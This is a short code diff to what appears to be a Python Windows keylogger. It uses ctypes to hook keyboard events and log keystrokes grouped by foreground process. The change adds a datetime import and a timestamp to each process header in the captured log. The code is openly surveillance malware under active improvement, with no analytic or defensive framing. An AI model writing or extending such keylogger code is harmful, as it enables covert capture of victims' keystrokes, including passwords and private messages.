@@ -1,6 +1,8 @@
 from ctypes import *
 from ctypes import wintypes
 
+import datetime
+
 import sys
 
 stdout_backup = sys.stdout
@@ -72,7 +74,8 @@ def hook_function(nCode, wParam, lParam):
     global last
     if last != get_foreground_process():
         last = get_foreground_process()
-        print(f"\n[{last.decode('latin-1')}]")
+        current_time = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+        print(f"\n[{last.decode('latin-1')}] [{current_time}]")
 
     if wParam == WM_KEYDOWN:
         keyboard = KBDLLHOOKSTRUCTS.from_address(lParam)
